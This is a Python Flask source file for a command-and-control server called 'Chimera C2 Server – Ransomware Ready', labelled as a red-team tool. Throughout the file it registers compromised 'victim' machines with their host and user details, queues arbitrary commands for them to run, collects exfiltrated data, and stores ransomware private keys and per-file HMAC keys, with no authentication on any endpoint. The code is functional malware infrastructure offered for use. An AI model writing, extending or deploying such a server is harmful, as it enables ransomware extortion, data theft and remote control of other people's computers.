"""
Chimera C2 Server – Ransomware Ready
====================================
A Flask-based Command & Control server for red-team exercises.
Provides a web dashboard, REST API for victim registration,
command queuing, data collection, and ransomware key storage.
"""

import json
import secrets
import logging
from datetime import datetime

from flask import Flask, request, jsonify, render_template
from flask_sqlalchemy import SQLAlchemy

# ------------------------------------------------------------------
# Configuration
# ------------------------------------------------------------------
class Config:
    SECRET_KEY = secrets.token_hex(32)
    SQLALCHEMY_DATABASE_URI = 'sqlite:///c2_database.db'
    SQLALCHEMY_TRACK_MODIFICATIONS = False
    DEBUG = False
    HOST = '0.0.0.0'
    PORT = 8080

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')

app = Flask(__name__)
app.config.from_object(Config)
db = SQLAlchemy(app)

# ------------------------------------------------------------------
# Database Models
# ------------------------------------------------------------------
class Victim(db.Model):
    __tablename__ = 'victims'
    id = db.Column(db.Integer, primary_key=True)
    victim_id = db.Column(db.String(128), unique=True, nullable=False)
    hostname = db.Column(db.String(100))
    ip = db.Column(db.String(50))
    mac = db.Column(db.String(50))
    os = db.Column(db.String(100))
    os_version = db.Column(db.String(200))
    architecture = db.Column(db.String(50))
    cpu = db.Column(db.String(100))
    memory = db.Column(db.String(50))
    disk = db.Column(db.String(200))
    username = db.Column(db.String(100))
    domain = db.Column(db.String(100))
    first_seen = db.Column(db.DateTime, default=datetime.now)
    last_seen = db.Column(db.DateTime, default=datetime.now)
    status = db.Column(db.String(50), default='active')

class Command(db.Model):
    __tablename__ = 'commands'
    id = db.Column(db.Integer, primary_key=True)
    victim_id = db.Column(db.String(128), nullable=False)
    command = db.Column(db.Text, nullable=False)
    status = db.Column(db.String(50), default='pending')
    result = db.Column(db.Text)
    issued_at = db.Column(db.DateTime, default=datetime.now)
    executed_at = db.Column(db.DateTime)

class CollectedData(db.Model):
    __tablename__ = 'collected_data'
    id = db.Column(db.Integer, primary_key=True)
    victim_id = db.Column(db.String(128), nullable=False)
    data_type = db.Column(db.String(50))
    content = db.Column(db.Text)
    timestamp = db.Column(db.DateTime, default=datetime.now)

class RansomwareKey(db.Model):
    __tablename__ = 'ransomware_keys'
    id = db.Column(db.Integer, primary_key=True)
    victim_id = db.Column(db.String(128), unique=True, nullable=False)
    private_key = db.Column(db.Text)
    hmac_keys = db.Column(db.Text)
    files_encrypted = db.Column(db.Integer, default=0)
    created_at = db.Column(db.DateTime, default=datetime.now)
    updated_at = db.Column(db.DateTime, default=datetime.now, onupdate=datetime.now)

# ------------------------------------------------------------------
# Helper: update victim last_seen
# ------------------------------------------------------------------
def update_victim_last_seen(victim_id):
    victim = Victim.query.filter_by(victim_id=victim_id).first()
    if victim:
        victim.last_seen = datetime.now()
        db.session.commit()
        return victim
    return None

# ------------------------------------------------------------------
# Routes
# ------------------------------------------------------------------
@app.route('/')
@app.route('/dashboard')
def dashboard():
    return render_template('index.html')

@app.route('/api/register', methods=['POST'])
def register():
    try:
        data = request.json
        vid = data.get('victim_id')
        if not vid:
            return jsonify({'status': 'error', 'message': 'Missing victim_id'}), 400
        victim = Victim.query.filter_by(victim_id=vid).first()
        if victim:
            victim.last_seen = datetime.now()
            victim.ip = data.get('ip', victim.ip)
            victim.mac = data.get('mac', victim.mac)
            victim.hostname = data.get('hostname', victim.hostname)
            victim.os = data.get('os', victim.os)
            victim.os_version = data.get('os_version', victim.os_version)
            victim.architecture = data.get('architecture', victim.architecture)
            victim.cpu = data.get('cpu', victim.cpu)
            victim.memory = data.get('memory', victim.memory)
            victim.disk = data.get('disk', victim.disk)
            victim.username = data.get('username', victim.username)
            victim.domain = data.get('domain', victim.domain)
            victim.status = 'active'
        else:
            victim = Victim(
                victim_id=vid,
                hostname=data.get('hostname', 'Unknown'),
                ip=data.get('ip', 'Unknown'),
                mac=data.get('mac', 'Unknown'),
                os=data.get('os', 'Unknown'),
                os_version=data.get('os_version', 'Unknown'),
                architecture=data.get('architecture', 'Unknown'),
                cpu=data.get('cpu', 'Unknown'),
                memory=data.get('memory', 'Unknown'),
                disk=data.get('disk', 'Unknown'),
                username=data.get('username', 'Unknown'),
                domain=data.get('domain', 'Unknown'),
                status='active'
            )
            db.session.add(victim)
        db.session.commit()
        logging.info(f"Registered/updated victim: {vid}")
        return jsonify({'status': 'registered'})
    except Exception as e:
        logging.error(f"Register error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/collect', methods=['POST'])
def collect():
    try:
        data = request.json
        vid = data.get('victim_id')
        data_type = data.get('type')
        content = data.get('content', {})
        if not vid or not data_type:
            return jsonify({'status': 'error', 'message': 'Missing victim_id or type'}), 400
        update_victim_last_seen(vid)
        if data_type == 'ransomware_keys':
            private_key = content.get('private_key', '')
            files_encrypted = content.get('files_encrypted', 0)
            rk = RansomwareKey.query.filter_by(victim_id=vid).first()
            if rk:
                rk.private_key = private_key
                rk.files_encrypted = files_encrypted
                rk.updated_at = datetime.now()
            else:
                rk = RansomwareKey(
                    victim_id=vid,
                    private_key=private_key,
                    files_encrypted=files_encrypted,
                    hmac_keys='{}'
                )
                db.session.add(rk)
            db.session.commit()
            logging.info(f"Ransomware keys received for {vid}")
        elif data_type == 'hmac_key':
            rk = RansomwareKey.query.filter_by(victim_id=vid).first()
            if rk:
                try:
                    hmac_dict = json.loads(rk.hmac_keys) if rk.hmac_keys else {}
                except:
                    hmac_dict = {}
                filepath = content.get('file', 'unknown')
                hmac_key = content.get('hmac_key', '')
                hmac_dict[filepath] = hmac_key
                rk.hmac_keys = json.dumps(hmac_dict)
                rk.updated_at = datetime.now()
                db.session.commit()
                logging.info(f"HMAC key added for {filepath}")
        else:
            record = CollectedData(
                victim_id=vid,
                data_type=data_type,
                content=json.dumps(content, default=str),
                timestamp=datetime.now()
            )
            db.session.add(record)
            db.session.commit()
            logging.info(f"Collected {data_type} from {vid}")
        return jsonify({'status': 'received'})
    except Exception as e:
        logging.error(f"Collect error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/get_command', methods=['POST'])
def get_command():
    try:
        data = request.json
        vid = data.get('victim_id')
        if not vid:
            return jsonify({'status': 'error', 'message': 'Missing victim_id'}), 400
        cmd = Command.query.filter_by(victim_id=vid, status='pending').first()
        if cmd:
            return jsonify({'has_command': True, 'command': cmd.command, 'command_id': cmd.id})
        return jsonify({'has_command': False})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/command_result', methods=['POST'])
def command_result():
    try:
        data = request.json
        cmd_id = data.get('command_id')
        result = data.get('result')
        cmd = Command.query.get(cmd_id)
        if cmd:
            cmd.status = 'executed'
            cmd.result = json.dumps(result, default=str) if result else '{}'
            cmd.executed_at = datetime.now()
            db.session.commit()
            logging.info(f"Command {cmd_id} executed")
            return jsonify({'status': 'updated'})
        else:
            return jsonify({'status': 'error', 'message': 'Command not found'}), 404
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/send_command', methods=['POST'])
def send_command():
    try:
        data = request.json
        vid = data.get('victim_id')
        cmd_text = data.get('command')
        if not vid or not cmd_text:
            return jsonify({'status': 'error', 'message': 'Missing victim_id or command'}), 400
        cmd = Command(victim_id=vid, command=cmd_text, status='pending')
        db.session.add(cmd)
        db.session.commit()
        logging.info(f"Command queued for {vid}: {cmd_text[:50]}")
        return jsonify({'status': 'queued', 'command_id': cmd.id})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/victims', methods=['GET'])
def get_victims():
    try:
        victims = Victim.query.order_by(Victim.last_seen.desc()).all()
        return jsonify({
            'victims': [{
                'id': v.victim_id,
                'hostname': v.hostname,
                'ip': v.ip,
                'mac': v.mac,
                'os': v.os,
                'os_version': v.os_version,
                'architecture': v.architecture,
                'cpu': v.cpu,
                'memory': v.memory,
                'disk': v.disk,
                'username': v.username,
                'domain': v.domain,
                'first_seen': v.first_seen.isoformat() if v.first_seen else None,
                'last_seen': v.last_seen.isoformat() if v.last_seen else None,
                'status': v.status
            } for v in victims]
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/victim/<victim_id>', methods=['GET'])
def get_victim(victim_id):
    try:
        victim = Victim.query.filter_by(victim_id=victim_id).first()
        if not victim:
            return jsonify({'error': 'Victim not found'}), 404
        data_entries = CollectedData.query.filter_by(victim_id=victim_id)\
            .order_by(CollectedData.timestamp.desc()).limit(50).all()
        commands = Command.query.filter_by(victim_id=victim_id)\
            .order_by(Command.issued_at.desc()).limit(20).all()
        return jsonify({
            'victim': {
                'id': victim.victim_id,
                'hostname': victim.hostname,
                'ip': victim.ip,
                'mac': victim.mac,
                'os': victim.os,
                'status': victim.status
            },
            'data': [{
                'id': d.id,
                'type': d.data_type,
                'content': json.loads(d.content) if d.content else {},
                'timestamp': d.timestamp.isoformat() if d.timestamp else None
            } for d in data_entries],
            'commands': [{
                'id': c.id,
                'command': c.command,
                'status': c.status,
                'result': c.result,
                'issued_at': c.issued_at.isoformat() if c.issued_at else None,
                'executed_at': c.executed_at.isoformat() if c.executed_at else None
            } for c in commands]
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/ransomware/<victim_id>', methods=['GET'])
def get_ransomware_status(victim_id):
    try:
        rk = RansomwareKey.query.filter_by(victim_id=victim_id).first()
        if rk:
            try:
                hmac_keys = json.loads(rk.hmac_keys) if rk.hmac_keys else {}
            except:
                hmac_keys = {}
            return jsonify({
                'exists': True,
                'data': {
                    'private_key': rk.private_key,
                    'hmac_keys': hmac_keys,
                    'files_encrypted': rk.files_encrypted,
                    'updated_at': rk.updated_at.isoformat() if rk.updated_at else None
                }
            })
        return jsonify({'exists': False})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/stats', methods=['GET'])
def get_stats():
    try:
        return jsonify({
            'total_victims': Victim.query.count(),
            'active_victims': Victim.query.filter_by(status='active').count(),
            'pending_commands': Command.query.filter_by(status='pending').count(),
            'total_data': CollectedData.query.count()
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ------------------------------------------------------------------
# Main entry point
# ------------------------------------------------------------------
if __name__ == '__main__':
    logging.info("=" * 60)
    logging.info("Chimera C2 Server - Ransomware Ready")
    logging.info("=" * 60)
    app.run(host=Config.HOST, port=Config.PORT, debug=Config.DEBUG)
